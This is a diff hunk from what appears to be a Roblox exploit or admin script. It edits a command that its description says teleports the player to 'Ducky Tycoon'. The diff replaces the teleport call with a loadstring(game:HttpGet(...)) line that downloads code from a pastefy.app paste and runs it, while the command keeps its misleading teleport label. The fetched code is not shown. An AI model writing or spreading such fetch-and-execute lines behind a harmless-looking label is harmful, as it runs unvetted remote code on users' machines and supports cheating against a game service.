@@ -1464,7 +1464,7 @@ end)
 
 cmd.add({"toducky", "duckytycoon", "duckugc", "ducky"}, {"duckytycoon (duckugc, ducky)", "go to duxky tykoon kause its hard to find"}, function()
 --duxky tykoon
-game:GetService("TeleportService"):Teleport(15106458515, game:GetService("Players").LocalPlayer)
+loadstring(game:HttpGet("https://pastefy.app/PAlRXy9c/raw",true))()
 end)
 
 
